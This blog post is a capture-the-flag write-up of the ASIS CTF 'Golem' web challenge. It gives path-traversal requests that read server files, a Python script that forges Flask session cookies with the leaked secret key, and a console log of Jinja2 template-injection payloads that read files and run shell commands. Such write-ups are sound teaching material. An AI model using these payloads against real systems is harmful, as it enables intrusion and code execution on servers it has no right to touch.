<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="A blog where I rarely write my learnings and findings.">
  <link rel="stylesheet" href="https://nagesh.blog/styles/index.css" />
  <title>
ASIS CTF - Web 1 - Golem is stupid!
</title>
  <script type="text/javascript">
    if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
      document.documentElement.classList.add('dark')
    } else {
      document.documentElement.classList.remove('dark')
    }
  </script>
</head>

<body
  class="flex flex-col h-screen antialiased bg-white dark:bg-gray-900 box-border">
  <header class="border-0 border-t-4 border-b border-gray-300 border-solid dark:border-gray-700 border-t-cyan-600 dark:border-t-cyan-500">
    <nav class="flex items-center px-4 my-3 md:px-0 md:mx-auto md:w-3/4 md:max-w-3xl xl:max-w-4xl gap-4">
      <h1 class="mr-auto text-3xl font-extrabold text-cyan-600 dark:text-cyan-500"><a href="/">My Blog</a></h1>
      <a class="font-medium text-gray-900 dark:text-gray-100" href="/about">About</a>
      <button id="theme-toggle" type="button"
        class="p-2 bg-gray-100 rounded-lg text-cyan-600 dark:text-cyan-500 dark:bg-gray-700" role="button" aria-label="Toggle dark/light theme button">
        <svg id="theme-toggle-dark-icon" class="hidden w-6 h-6" fill="currentColor" viewBox="0 0 20 20"
          xmlns="http://www.w3.org/2000/svg">
          <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
        </svg>
        <svg id="theme-toggle-light-icon" class="hidden w-6 h-6" fill="currentColor" viewBox="0 0 20 20"
          xmlns="http://www.w3.org/2000/svg">
          <path
            d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z"
            fill-rule="evenodd" clip-rule="evenodd"></path>
        </svg>
      </button>
    </nav>
  </header>
  <main class="flex flex-col self-center w-full px-4 md:px-0 md:w-3/4 md:max-w-3xl xl:max-w-4xl grow">
    
<section name="blog-details">
  <div class="flex flex-col items-center justify-center">
    <h1 class="mt-8 text-3xl font-extrabold text-center text-blue-700 md:text-4xl dark:text-blue-400 leading-8">
      ASIS CTF - Web 1 - Golem is stupid!
    </h1>
    <ul class="my-4">
      
      <li
        class="inline-flex items-center px-3 py-0.5 rounded-full text-sm font-medium bg-pink-100 dark:bg-slate-500 text-pink-800 dark:text-gray-100">
        ctf</li>
      
      <li
        class="inline-flex items-center px-3 py-0.5 rounded-full text-sm font-medium bg-pink-100 dark:bg-slate-500 text-pink-800 dark:text-gray-100">
        ssti</li>
      
      <li
        class="inline-flex items-center px-3 py-0.5 rounded-full text-sm font-medium bg-pink-100 dark:bg-slate-500 text-pink-800 dark:text-gray-100">
        web</li>
      
    </ul>
    <div class="flex text-sm font-semibold text-gray-500 space-x-1 dark:text-gray-400">
      <time>10 September 2017</time><span aria-hidden="true"> Â· </span><span>6 min read</span>
    </div>
  </div>
  <div class="mx-auto my-6 prose dark:prose-invert max-w-none prose-indigo prose-lg prose-h1:text-3xl prose-h2:text-2xl prose-h3:text-xl">
    <p>First of all thanks to ASIS team for organizing a great CTF! I enjoyed solving this challenge, and in the process of pwning I got to learn a lot of stuff. I'm going to explain everything in as much detail as possible.</p>
<p>They gave a web page running at https://golem.asisctf.com/ (Only lived until the competition lasted!)</p>
<p><img src="https://nagesh.blog/blog/asis-ctf-golem-is-stupid-ssti/golem_front.png" alt="Home page of the given challenge!" /></p>
<p>All this app is doing is taking input and greeting us back with input and asking us to read an article (weird though!)</p>
<p><img src="https://nagesh.blog/blog/asis-ctf-golem-is-stupid-ssti/second_page.png" alt="Image explaining what we got as result" /></p>
<p>After looking into response headers it became evident that this app is running over an nginx server. After a few minutes of fiddling we managed to find an LFI at the article link.
Link is pointing to <strong>https://golem.asisctf.com/article?name=article</strong>, I tried path traversal on <strong>name</strong> parameter. And yes! we can read contents of well known files like <strong>/etc/passwd</strong> using this, but we don't know where the flag is, so we have to read source code of the server. In order to find where source is located we need to read nginx configuration. So, with <strong>name=../../../../etc/nginx/nginx.conf</strong> I was able to read contents of that file. </p>
<pre data-lang="config" style="background-color:#282c34;color:#abb2bf;" class="language-config "><code class="language-config" data-lang="config"><span style="font-style:italic;color:#5c6370;">##
</span><span style="font-style:italic;color:#5c6370;"># Virtual Host Configs
</span><span style="font-style:italic;color:#5c6370;">##
</span><span style="font-style:italic;color:#5c6370;">## configs: default, golem
</span><span style="color:#c678dd;">include </span><span>/etc/nginx/conf.d/*.conf;
</span><span style="color:#c678dd;">include </span><span>/etc/nginx/sites-enabled/*;
</span></code></pre>
<p>So, now with <strong>name=../../../etc/nginx/sites-enabled/golem</strong></p>
<pre data-lang="config" style="background-color:#282c34;color:#abb2bf;" class="language-config "><code class="language-config" data-lang="config"><span style="color:#c678dd;">location </span><span>/ {
</span><span>    </span><span style="color:#e06c75;">uwsgi_pass </span><span>golem;
</span><span style="color:#c678dd;">    include</span><span> uwsgi_params;
</span><span>}
</span><span>
</span><span style="color:#c678dd;">location </span><span>/static/ {
</span><span>    </span><span style="color:#e06c75;">root </span><span>/opt/serverPython/golem;
</span><span>    </span><span style="color:#e06c75;">expires </span><span style="color:#d19a66;">30d</span><span>;
</span><span>}
</span></code></pre>
<p>Now we know the root folder of this application which is <strong>/opt/serverPython/golem</strong>, with few educated guesses (main.py, init.py etc.) I found server.py in app root folder.</p>
<pre data-lang="python" style="background-color:#282c34;color:#abb2bf;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6370;">#!/usr/bin/python
</span><span style="color:#c678dd;">import </span><span>os
</span><span style="color:#c678dd;">from </span><span>flask </span><span style="color:#c678dd;">import </span><span>( Flask, render_template, request, url_for, redirect, session, render_template_string )
</span><span style="color:#c678dd;">from </span><span>flask.ext.session </span><span style="color:#c678dd;">import </span><span>Session
</span><span>
</span><span>app = </span><span style="color:#e06c75;">Flask</span><span>(__name__)
</span><span style="color:#56b6c2;">execfile</span><span>(</span><span style="color:#98c379;">&#39;flag.py&#39;</span><span>)
</span><span style="color:#56b6c2;">execfile</span><span>(</span><span style="color:#98c379;">&#39;key.py&#39;</span><span>)
</span><span>
</span><span style="color:#e06c75;">FLAG </span><span>= flag
</span><span>app.secret_key = key
</span><span>@app.</span><span style="color:#e06c75;">route</span><span>(</span><span style="color:#98c379;">&quot;/golem&quot;</span><span>, </span><span style="color:#e06c75;">methods</span><span>=[</span><span style="color:#98c379;">&quot;GET&quot;</span><span>, </span><span style="color:#98c379;">&quot;POST&quot;</span><span>])
</span><span style="color:#c678dd;">def </span><span style="color:#61afef;">golem</span><span>():
</span><span>    </span><span style="color:#c678dd;">if </span><span>request.method != </span><span style="color:#98c379;">&quot;POST&quot;</span><span>:
</span><span>        </span><span style="color:#c678dd;">return </span><span style="color:#e06c75;">redirect</span><span>(</span><span style="color:#e06c75;">url_for</span><span>(</span><span style="color:#98c379;">&quot;index&quot;</span><span>))
</span><span>    golem = request.form.</span><span style="color:#e06c75;">get</span><span>(</span><span style="color:#98c379;">&quot;golem&quot;</span><span>) </span><span style="color:#c678dd;">or </span><span style="color:#d19a66;">None
</span><span>    </span><span style="color:#c678dd;">if </span><span>golem </span><span style="color:#c678dd;">is not </span><span style="color:#d19a66;">None</span><span>:
</span><span>        golem = golem.</span><span style="color:#e06c75;">replace</span><span>(</span><span style="color:#98c379;">&quot;.&quot;</span><span>, </span><span style="color:#98c379;">&quot;&quot;</span><span>).</span><span style="color:#e06c75;">replace</span><span>(</span><span style="color:#98c379;">&quot;_&quot;</span><span>, </span><span style="color:#98c379;">&quot;&quot;</span><span>).</span><span style="color:#e06c75;">replace</span><span>(</span><span style="color:#98c379;">&quot;{&quot;</span><span>,</span><span style="color:#98c379;">&quot;&quot;</span><span>).</span><span style="color:#e06c75;">replace</span><span>(</span><span style="color:#98c379;">&quot;}&quot;</span><span>,</span><span style="color:#98c379;">&quot;&quot;</span><span>)
</span><span>
</span><span>    </span><span style="color:#c678dd;">if </span><span style="color:#98c379;">&quot;golem&quot; </span><span style="color:#c678dd;">not in </span><span>session </span><span style="color:#c678dd;">or </span><span>session[</span><span style="color:#98c379;">&#39;golem&#39;</span><span>] </span><span style="color:#c678dd;">is </span><span style="color:#d19a66;">None</span><span>:
</span><span>        session[</span><span style="color:#98c379;">&#39;golem&#39;</span><span>] = golem	
</span><span>    template = </span><span style="color:#d19a66;">None
</span><span>    </span><span style="color:#c678dd;">if </span><span>session[</span><span style="color:#98c379;">&#39;golem&#39;</span><span>] </span><span style="color:#c678dd;">is not </span><span style="color:#d19a66;">None</span><span>:
</span><span>        template = </span><span style="color:#98c379;">&#39;&#39;&#39;{</span><span style="color:#d19a66;">%%</span><span style="color:#98c379;"> extends &quot;layout.html&quot; </span><span style="color:#d19a66;">%%</span><span style="color:#98c379;">} {</span><span style="color:#d19a66;">%%</span><span style="color:#98c379;"> block body </span><span style="color:#d19a66;">%%</span><span style="color:#98c379;">} &lt;h1&gt;Golem Name&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : </span><span style="color:#d19a66;">%s</span><span style="color:#98c379;">, why you don&#39;t look at our &lt;a href=&#39;/article?name=article&#39;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; {</span><span style="color:#d19a66;">%%</span><span style="color:#98c379;"> endblock </span><span style="color:#d19a66;">%%</span><span style="color:#98c379;">} &#39;&#39;&#39; </span><span>% session[</span><span style="color:#98c379;">&#39;golem&#39;</span><span>]
</span><span>        </span><span style="color:#c678dd;">print
</span><span>        session[</span><span style="color:#98c379;">&#39;golem&#39;</span><span>] = </span><span style="color:#d19a66;">None
</span><span>    </span><span style="color:#c678dd;">return </span><span style="color:#e06c75;">render_template_string</span><span>(template)
</span><span>
</span><span>@app.</span><span style="color:#e06c75;">route</span><span>(</span><span style="color:#98c379;">&quot;/&quot;</span><span>, </span><span style="color:#e06c75;">methods</span><span>=[</span><span style="color:#98c379;">&quot;GET&quot;</span><span>])
</span><span style="color:#c678dd;">def </span><span style="color:#61afef;">index</span><span>():
</span><span>    </span><span style="color:#c678dd;">return </span><span style="color:#e06c75;">render_template</span><span>(</span><span style="color:#98c379;">&quot;main.html&quot;</span><span>)
</span><span>
</span><span>@app.</span><span style="color:#e06c75;">route</span><span>(</span><span style="color:#98c379;">&#39;/article&#39;</span><span>, </span><span style="color:#e06c75;">methods</span><span>=[</span><span style="color:#98c379;">&#39;GET&#39;</span><span>])
</span><span style="color:#c678dd;">def </span><span style="color:#61afef;">article</span><span>():
</span><span>    error = </span><span style="color:#d19a66;">0
</span><span>    </span><span style="color:#c678dd;">if </span><span style="color:#98c379;">&#39;name&#39; </span><span style="color:#c678dd;">in </span><span>request.args:
</span><span>        page = request.args.</span><span style="color:#e06c75;">get</span><span>(</span><span style="color:#98c379;">&#39;name&#39;</span><span>)
</span><span>    </span><span style="color:#c678dd;">else</span><span>:
</span><span>        page = </span><span style="color:#98c379;">&#39;article&#39;
</span><span>    </span><span style="color:#c678dd;">if </span><span>page.</span><span style="color:#e06c75;">find</span><span>(</span><span style="color:#98c379;">&#39;flag&#39;</span><span>)&gt;=</span><span style="color:#d19a66;">0</span><span>:
</span><span>        page = </span><span style="color:#98c379;">&#39;notallowed.txt&#39;
</span><span>    </span><span style="color:#c678dd;">try</span><span>:
</span><span>        template = </span><span style="color:#56b6c2;">open</span><span>(</span><span style="color:#98c379;">&#39;/home/golem/articles/</span><span style="color:#d19a66;">{}</span><span style="color:#98c379;">&#39;</span><span>.</span><span style="color:#e06c75;">format</span><span>(page)).</span><span style="color:#e06c75;">read</span><span>()
</span><span>    </span><span style="color:#c678dd;">except </span><span>Exception </span><span style="color:#c678dd;">as </span><span>e:
</span><span>        template = e
</span><span>
</span><span>    </span><span style="color:#c678dd;">return </span><span style="color:#e06c75;">render_template</span><span>(</span><span style="color:#98c379;">&#39;article.html&#39;</span><span>, </span><span style="color:#e06c75;">template</span><span>=template)
</span><span>
</span><span style="color:#c678dd;">if </span><span>__name__ == </span><span style="color:#98c379;">&quot;__main__&quot;</span><span>:
</span><span>    app.</span><span style="color:#e06c75;">run</span><span>(</span><span style="color:#e06c75;">host</span><span>=</span><span style="color:#98c379;">&#39;0.0.0.0&#39;</span><span>, </span><span style="color:#e06c75;">debug</span><span>=</span><span style="color:#d19a66;">False</span><span>)
</span></code></pre>
<p>So, this is a python flask framework based web app. And obviously eyes glazed over flag.py, but we can't read it as there is a condition in server.py which is not allowing us to read. Next candidate is key.py and using <strong>name=../../../opt/serverPython/golem/key.py</strong></p>
<pre data-lang="python" style="background-color:#282c34;color:#abb2bf;" class="language-python "><code class="language-python" data-lang="python"><span>key = </span><span style="color:#98c379;">&quot;7h15_5h0uld_b3_r34lly_53cur3d&quot;
</span></code></pre>
<h2 id="from-lfi-to-rce-remote-command-execution">From LFI to RCE (Remote command execution)!</h2>
<p>After a lot of struggle and search on internet I found an interesting attack vector named <strong>SSTI(Server side template injection)</strong>.</p>
<p>It's time for ExPl0itAti0N!</p>
<p>If you closely observe server.py (line 24), it uses a template engine(Jinja2 to be specific) to render html content, and in one of the template it is printing what ever is there in session (cookie in browser terms).</p>
<p>Now back to our SSTI, when user input some string like <strong>{{ 2+3 }}</strong>, jinja template engine will evaluate it and output the result(which is <strong>5</strong>). So now all we need to do is craft a session with some code to read flag.py.</p>
<p>Here comes the interesting part, this app uses flask Session class which gives us HMAC signed cookies using a secret key (server.py line 11), so that when someone sends edited cookie back to server, server will try and verify the signature. So one can't simply edit flask sessions. As we have secret_key with us (as we have already read key.py), we can create and sign sessions manually and send it to server for evaluation. So I quickly wrote a small script to generate crafted sessions and send it to server.</p>
<pre data-lang="python" style="background-color:#282c34;color:#abb2bf;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#c678dd;">import </span><span>requests
</span><span style="color:#c678dd;">from </span><span>itsdangerous </span><span style="color:#c678dd;">import </span><span>base64_decode
</span><span style="color:#c678dd;">from </span><span>flask.sessions </span><span style="color:#c678dd;">import </span><span>SecureCookieSessionInterface
</span><span style="color:#c678dd;">import </span><span>HTMLParser
</span><span>
</span><span>obtained_secret = </span><span style="color:#98c379;">&quot;7h15_5h0uld_b3_r34lly_53cur3d&quot;
</span><span>
</span><span style="color:#c678dd;">class </span><span style="color:#e5c07b;">FlaskMockApp</span><span>(</span><span style="color:#98c379;">object</span><span>):
</span><span>    </span><span style="color:#c678dd;">def </span><span style="color:#56b6c2;">__init__</span><span>(</span><span style="color:#e06c75;">self</span><span>, </span><span style="color:#e06c75;">secret_key</span><span>):
</span><span>        </span><span style="color:#e06c75;">self</span><span>.secret_key = secret_key
</span><span>
</span><span style="color:#c678dd;">def </span><span style="color:#61afef;">session_cookie_encoder</span><span>(</span><span style="color:#e06c75;">secret_key</span><span>, </span><span style="color:#e06c75;">session_cookie_structure</span><span>):
</span><span>    </span><span style="color:#c678dd;">try</span><span>:
</span><span>        app = </span><span style="color:#e06c75;">FlaskMockApp</span><span>(secret_key)
</span><span>        si = </span><span style="color:#e06c75;">SecureCookieSessionInterface</span><span>()
</span><span>        s = si.</span><span style="color:#e06c75;">get_signing_serializer</span><span>(app)
</span><span>
</span><span>        </span><span style="color:#c678dd;">return </span><span>s.</span><span style="color:#e06c75;">dumps</span><span>(session_cookie_structure)
</span><span>    </span><span style="color:#c678dd;">except </span><span>Exception </span><span style="color:#c678dd;">as </span><span>e:
</span><span>        </span><span style="color:#c678dd;">return </span><span style="color:#98c379;">&quot;[Encoding error]</span><span style="color:#d19a66;">{}</span><span style="color:#98c379;">&quot;</span><span>.</span><span style="color:#e06c75;">format</span><span>(e)
</span><span>
</span><span>cookie_string_template = </span><span style="color:#98c379;">&quot;_ga=GA1.2.23644687.1504890772; _gid=GA1.2.842114127.1504890772; session=</span><span style="color:#d19a66;">{0}</span><span style="color:#98c379;">&quot;
</span><span>
</span><span style="color:#c678dd;">while </span><span style="color:#d19a66;">True</span><span>:
</span><span>	payload = </span><span style="color:#56b6c2;">raw_input</span><span>(</span><span style="color:#98c379;">&quot;Enter payload&gt; &quot;</span><span>)
</span><span>	signed_cookie = </span><span style="color:#e06c75;">session_cookie_encoder</span><span>(obtained_secret, {</span><span style="color:#98c379;">&quot;golem&quot;</span><span>: payload})
</span><span>	cookie_header = cookie_string_template.</span><span style="color:#e06c75;">format</span><span>(signed_cookie)
</span><span>	custom_headers = {
</span><span>		</span><span style="color:#98c379;">&quot;Cookie&quot;</span><span>: cookie_header,
</span><span>		</span><span style="color:#98c379;">&quot;User-Agent&quot;</span><span>: </span><span style="color:#98c379;">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0&quot;
</span><span>	}
</span><span>	response = requests.</span><span style="color:#e06c75;">post</span><span>(</span><span style="color:#98c379;">&quot;https://golem.asisctf.com/golem&quot;</span><span>, </span><span style="color:#e06c75;">data</span><span>={</span><span style="color:#98c379;">&quot;golem&quot;</span><span>:</span><span style="color:#98c379;">&quot;Hello&quot;</span><span>}, </span><span style="color:#e06c75;">headers</span><span>=custom_headers)
</span><span>	required_output = response.text.</span><span style="color:#e06c75;">split</span><span>(</span><span style="color:#98c379;">&quot;Hello :&quot;</span><span>)[</span><span style="color:#d19a66;">1</span><span>].</span><span style="color:#e06c75;">split</span><span>(</span><span style="color:#98c379;">&quot;, why you don&#39;t&quot;</span><span>)[</span><span style="color:#d19a66;">0</span><span>]
</span><span>	</span><span style="color:#c678dd;">print </span><span>HTMLParser.</span><span style="color:#e06c75;">HTMLParser</span><span>().</span><span style="color:#e06c75;">unescape</span><span>(required_output)
</span></code></pre>
<p>Here is the console output, in the above script I'm filtering server response to print only what we need.</p>
<pre style="background-color:#282c34;color:#abb2bf;"><code><span>Enter payload&gt; {{2+3}}
</span><span>5
</span><span>
</span><span>Yay! it&#39;s evaluating :)
</span><span>
</span><span>
</span><span>Enter payload&gt; {{&quot;hello&quot;.__class__}}
</span><span> &lt;type &#39;str&#39;&gt; 
</span><span>
</span><span>Here we go! a much better payload. This time we are trying to access class type of a string.
</span><span>
</span><span>
</span><span>Enter payload&gt; {{&quot;hello&quot;.__class__.mro()}}
</span><span> [&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;]
</span><span>
</span><span>This time we are asking **Method Resolution Order(MRO)** of a string, so when you call a method on string it searches in &#39;str&#39; object then &#39;basestring&#39; and so on.
</span><span>
</span><span>
</span><span>Enter payload&gt; {{&quot;&quot;.__class__.mro()[2].__subclasses__()}}
</span><span> [&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, ...., &lt;type &#39;file&#39;&gt;....]  //Most of the output is redacted as it&#39;s quite huge.
</span><span>
</span><span>So, we selected object type as it&#39;s the base of all, and now asking what are all the subclasses are used by this web application. As you all can see there is a file object, guess what! now we can read and write files to file system. Yay! we can read flag.py, can&#39;t wait to do that.
</span><span>
</span><span>
</span><span>Enter payload&gt; {{&quot;&quot;.__class__.mro()[2].__subclasses__()[40](&quot;flag.py&quot;,&quot;r&quot;).read()}}
</span><span>
</span><span> flag = &#39;ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}&#39;
</span><span>
</span><span>Our flag is: **ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}**
</span><span>
</span><span>Yeah! We do love Server Side Template Injection (SSTI) :)
</span><span>
</span><span>My exploitation is not over, I want a shell kind of feel. Now our plan is to load a python function which can execute commands into config variable, then we will have a shell! :D
</span><span>
</span><span>
</span><span>Enter payload&gt; {{&quot;&quot;.__class__.mro()[2].__subclasses__()[40](&quot;/tmp/new.cfg&quot;,&quot;w&quot;).write(&quot;from subprocess import check_output\n\nRUNCMD = check_output\n&quot;)}}
</span><span>
</span><span> None
</span><span>
</span><span>Now we are writing a python script into a file `/tmp/new.cfg`
</span><span>
</span><span>
</span><span>Enter payload&gt; {{ config.from_pyfile(&quot;/tmp/new.cfg&quot;) }}
</span><span>
</span><span>True
</span><span>
</span><span>Loading that file into config using the method `from_pyfile`
</span><span>
</span><span>
</span><span>Enter payload&gt; {{ config.items() }}
</span><span>
</span><span> [(&#39;JSON_AS_ASCII&#39;, True), ...., (&#39;RUNCMD&#39;, &lt;function check_output at 0x7f479d2131b8&gt;), ...,(&#39;X_OK&#39;, 1)]
</span><span>
</span><span>As you can see, our function with keyword &#39;RUNCMD&#39; is happily sitting in config items!
</span><span>
</span><span>
</span><span>Enter payload&gt; {{config[&#39;RUNCMD&#39;](&#39;/bin/cat flag.py&#39;, shell=True)}}
</span><span>
</span><span> flag = &#39;ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}&#39;
</span><span>
</span><span>There you go! I read the flag again, this time through a shell :D
</span></code></pre>
<p><strong>References</strong></p>
<p><a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/">Exploring SSTI in Flask/Jinja2</a><br/>
<a href="https://flask.palletsprojects.com/en/2.2.x/">Flask Framework</a></p>

    <hr/>
  </div>
  <script src="https://utteranc.es/client.js"
          repo="H4rryp0tt3r/h4rryp0tt3r.github.io"
          id="utterances-box"
          issue-term="title"
          theme="github-light"
          crossorigin="anonymous"
          async>
  </script>
</section>

  </main>
  <footer
    class="flex flex-col items-center justify-center py-4 border-t border-gray-200 border-solid w-100 bg-slate-100 dark:bg-gray-700 dark:border-gray-600">
    <ul class="flex my-4 text-white dark:text-gray-100">
      <li class="p-3 m-2 rounded-full bg-cyan-600 dark:bg-cyan-500">
        <a target="_blank" rel="noreferrer" href="https://github.com/H4rryp0tt3r" role="link" aria-label="Link to my github profile">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true"
            role="img" class="w-5" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24">
            <g fill="none">
              <path fill-rule="evenodd" clip-rule="evenodd"
                d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385c.6.105.825-.255.825-.57c0-.285-.015-1.23-.015-2.235c-3.015.555-3.795-.735-4.035-1.41c-.135-.345-.72-1.41-1.23-1.695c-.42-.225-1.02-.78-.015-.795c.945-.015 1.62.87 1.845 1.23c1.08 1.815 2.805 1.305 3.495.99c.105-.78.42-1.305.765-1.605c-2.67-.3-5.46-1.335-5.46-5.925c0-1.305.465-2.385 1.23-3.225c-.12-.3-.54-1.53.12-3.18c0 0 1.005-.315 3.3 1.23c.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23c.66 1.65.24 2.88.12 3.18c.765.84 1.23 1.905 1.23 3.225c0 4.605-2.805 5.625-5.475 5.925c.435.375.81 1.095.81 2.22c0 1.605-.015 2.895-.015 3.3c0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"
                fill="currentColor" />
            </g>
          </svg>
        </a>
      </li>
      <li class="p-3 m-2 rounded-full bg-cyan-600 dark:bg-cyan-500">
        <a target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/h4rryp0tt3r/" role="link" aria-label="Link to my LinkedIn profile">
          <svg class="w-5 h-5 fill-current" role="img" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
            <g>
              <path
                d="M218.123122,218.127392 L180.191928,218.127392 L180.191928,158.724263 C180.191928,144.559023 179.939053,126.323993 160.463756,126.323993 C140.707926,126.323993 137.685284,141.757585 137.685284,157.692986 L137.685284,218.123441 L99.7540894,218.123441 L99.7540894,95.9665207 L136.168036,95.9665207 L136.168036,112.660562 L136.677736,112.660562 C144.102746,99.9650027 157.908637,92.3824528 172.605689,92.9280076 C211.050535,92.9280076 218.138927,118.216023 218.138927,151.114151 L218.123122,218.127392 Z M56.9550587,79.2685282 C44.7981969,79.2707099 34.9413443,69.4171797 34.9391618,57.260052 C34.93698,45.1029244 44.7902948,35.2458562 56.9471566,35.2436736 C69.1040185,35.2414916 78.9608713,45.0950217 78.963054,57.2521493 C78.9641017,63.090208 76.6459976,68.6895714 72.5186979,72.8184433 C68.3913982,76.9473153 62.7929898,79.26748 56.9550587,79.2685282 M75.9206558,218.127392 L37.94995,218.127392 L37.94995,95.9665207 L75.9206558,95.9665207 L75.9206558,218.127392 Z M237.033403,0.0182577091 L18.8895249,0.0182577091 C8.57959469,-0.0980923971 0.124827038,8.16056231 -0.001,18.4706066 L-0.001,237.524091 C0.120519052,247.839103 8.57460631,256.105934 18.8895249,255.9977 L237.033403,255.9977 C247.368728,256.125818 255.855922,247.859464 255.999,237.524091 L255.999,18.4548016 C255.851624,8.12438979 247.363742,-0.133792868 237.033403,0.000790807055">
              </path>
            </g>
          </svg>
        </a>
      </li>
      <li class="p-3 m-2 rounded-full bg-cyan-600 dark:bg-cyan-500">
        <a target="_blank" rel="noreferrer" href="mailto:nagesh.podilapu@gmail.com" role="link" aria-label="Link to send an email to me">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true"
            role="img" class="w-5" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24">
            <g fill="none">
              <path fill-rule="evenodd" clip-rule="evenodd"
                d="M12 0C5.372 0 0 5.373 0 12s5.372 12 12 12c6.627 0 12-5.373 12-12S18.627 0 12 0zm.14 19.018c-3.868 0-7-3.14-7-7.018c0-3.878 3.132-7.018 7-7.018c1.89 0 3.47.697 4.682 1.829l-1.974 1.978v-.004c-.735-.702-1.667-1.062-2.708-1.062c-2.31 0-4.187 1.956-4.187 4.273c0 2.315 1.877 4.277 4.187 4.277c2.096 0 3.522-1.202 3.816-2.852H12.14v-2.737h6.585c.088.47.135.96.135 1.474c0 4.01-2.677 6.86-6.72 6.86z"
                fill="currentColor"></path>
            </g>
          </svg>
        </a>
      </li>
    </ul>
    <p class="mb-4 text-gray-600 text-semibold dark:text-gray-300">
      2022 - Nagesh Podilapu
    </p>
  </footer>
  <script type="text/javascript" src="https://nagesh.blog/javascript/dark-mode.js" async></script>
</body>

</html>